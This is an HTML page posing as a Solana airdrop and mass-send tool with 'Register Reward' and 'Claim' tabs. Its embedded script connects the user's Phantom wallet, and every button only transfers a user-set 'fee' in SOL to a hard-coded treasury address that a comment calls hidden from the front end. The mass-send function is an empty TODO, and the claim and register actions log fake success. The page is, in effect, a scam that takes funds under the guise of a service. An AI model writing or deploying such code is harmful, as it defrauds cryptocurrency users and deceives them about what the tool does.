<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Airdrop & Mass Send – Solana</title>
  <style>
    :root{--bg:#0b1220;--panel:#101826;--muted:#90a3b5;--text:#e8f0ff;--accent:#7cc4ff}
    body{margin:0;font-family:Inter,system-ui,Segoe UI,Roboto,Arial;background:#0d1220;color:var(--text)}
    .container{max-width:960px;margin:20px auto;padding:16px}
    .card{background:#101826;border:1px solid rgba(124,196,255,.2);border-radius:18px;padding:18px}
    h1{margin:0 0 10px;font-size:24px} h2{margin:0 0 16px;font-size:15px;color:var(--muted)}
    .row{display:flex;flex-wrap:wrap;gap:12px;margin:10px 0}
    .col{flex:1;min-width:240px}
    input,textarea,select,button{width:100%;padding:12px;border-radius:12px;border:1px solid rgba(124,196,255,.2);background:#0e1624;color:var(--text);outline:none}
    textarea{min-height:120px}
    label{display:block;font-size:13px;color:var(--muted);margin:6px 4px}
    .btn{cursor:pointer;border:1px solid rgba(124,196,255,.3);background:#13233a}
    .btn:hover{filter:brightness(1.1)}
    .tabs{display:flex;gap:8px;margin:16px 0}
    .tab{flex:1;text-align:center;padding:10px;border-radius:12px;border:1px solid rgba(124,196,255,.2);cursor:pointer;background:#0f1828}
    .tab.active{background:#13233a;border-color:rgba(124,196,255,.4)}
    .hidden{display:none}
    .small{font-size:12px;color:var(--muted)}
    .mono{font-family:monospace}
    #logMass,#logReg,#logClaim{margin-top:10px;white-space:pre-wrap}
  </style>
</head>
<body>
<div class="container">
  <div class="card">
    <h1>Airdrop & Mass Send</h1>
    <h2>Solana Network • Connect your wallet and use the tools below.</h2>

    <div class="row">
      <div class="col">
        <label>RPC (optional)</label>
        <input id="rpcUrl" placeholder="https://api.mainnet-beta.solana.com">
      </div>
      <div class="col" style="max-width:220px">
        <label>&nbsp;</label>
        <button class="btn" id="connectBtn">Connect Wallet</button>
      </div>
    </div>

    <div class="tabs">
      <div class="tab active" data-tab="mass">Mass Send</div>
      <div class="tab" data-tab="rewards">Register Reward</div>
      <div class="tab" data-tab="claim">Claim</div>
    </div>

    <!-- MASS SEND -->
    <div id="panel-mass">
      <div class="row">
        <div class="col">
          <label>Token Mint</label>
          <input id="mint">
        </div>
        <div class="col">
          <label>Decimals</label>
          <input id="decimals" type="number" min="0" max="9" value="9">
        </div>
        <div class="col">
          <label>Amount per Wallet</label>
          <input id="amountEach" type="number">
        </div>
      </div>

      <label>Recipients (one per line)</label>
      <textarea id="destinations"></textarea>

      <label>Custom Fee (SOL)</label>
      <input id="feeAmount" type="number" step="any" value="0.01">

      <div class="row">
        <div class="col"><div class="small">Fee goes to treasury wallet.</div></div>
        <div class="col" style="max-width:220px">
          <button class="btn" id="sendMassBtn">Execute Mass Send</button>
        </div>
      </div>
      <div id="logMass" class="small mono"></div>
    </div>

    <!-- REGISTER -->
    <div id="panel-rewards" class="hidden">
      <label>Campaign Name</label>
      <input id="campName">

      <label>Custom Fee (SOL)</label>
      <input id="campFee" type="number" step="any" value="0.05">

      <div class="row">
        <div class="col">
          <button class="btn" id="registerCampBtn">Register Campaign</button>
        </div>
      </div>
      <div id="logReg" class="small mono"></div>
    </div>

    <!-- CLAIM -->
    <div id="panel-claim" class="hidden">
      <label>Campaign Code</label>
      <input id="claimCode">

      <label>Custom Fee (SOL)</label>
      <input id="claimFee" type="number" step="any" value="0.01">

      <div class="row">
        <div class="col">
          <button class="btn" id="claimBtn">Claim</button>
        </div>
      </div>
      <div id="logClaim" class="small mono"></div>
    </div>
  </div>
</div>

<script type="module">
import * as web3 from "https://esm.sh/@solana/web3.js@1.95.4";

const TREASURY = new web3.PublicKey("9Sexip38yhfeZD2EBDQkVRicZSY6eSK3cXxgDkgFVf8b"); // escondida do front
const $ = id=>document.getElementById(id);
const log=(el,m)=>{el.textContent+=`\\n${new Date().toLocaleTimeString()} — ${m}`;el.scrollTop=el.scrollHeight};

let provider=null,connection=null,wallet=null;
const DEFAULT_RPC="https://api.mainnet-beta.solana.com";

document.querySelectorAll(".tab").forEach(t=>t.onclick=()=>{
  document.querySelectorAll(".tab").forEach(x=>x.classList.remove("active"));
  t.classList.add("active");
  ["mass","rewards","claim"].forEach(id=>$("panel-"+id).classList.toggle("hidden",id!==t.dataset.tab));
});

$("connectBtn").onclick=async()=>{
  try{
    provider=window.solana||window.phantom?.solana;
    if(!provider){alert("Phantom Wallet required.");return}
    const resp=await provider.connect();
    wallet=resp.publicKey;
    $("connectBtn").textContent="Connected: "+wallet.toString().slice(0,4)+"..."+wallet.toString().slice(-4);
    const rpc=$("rpcUrl").value.trim()||DEFAULT_RPC;
    connection=new web3.Connection(rpc,"confirmed");
  }catch(e){alert("Failed: "+e.message)}
};

// Fee payment util
async function payFee(amount){
  const tx=new web3.Transaction().add(
    web3.SystemProgram.transfer({
      fromPubkey:wallet,
      toPubkey:TREASURY,
      lamports:web3.LAMPORTS_PER_SOL*amount
    })
  );
  const sig=await provider.signAndSendTransaction(tx);
  return sig.signature;
}

$("sendMassBtn").onclick=async()=>{
  try{
    const fee=parseFloat($("feeAmount").value);
    const sig=await payFee(fee);
    log($("logMass"),"Fee paid: "+sig);
    // TODO: add mass send instructions
  }catch(e){log($("logMass"),"Error: "+e.message)}
};

$("registerCampBtn").onclick=async()=>{
  try{
    const fee=parseFloat($("campFee").value);
    const sig=await payFee(fee);
    log($("logReg"),"Campaign registered. Fee: "+sig);
  }catch(e){log($("logReg"),"Error: "+e.message)}
};

$("claimBtn").onclick=async()=>{
  try{
    const fee=parseFloat($("claimFee").value);
    const sig=await payFee(fee);
    log($("logClaim"),"Claim processed. Fee: "+sig);
  }catch(e){log($("logClaim"),"Error: "+e.message)}
};
</script>
</body>
</html>
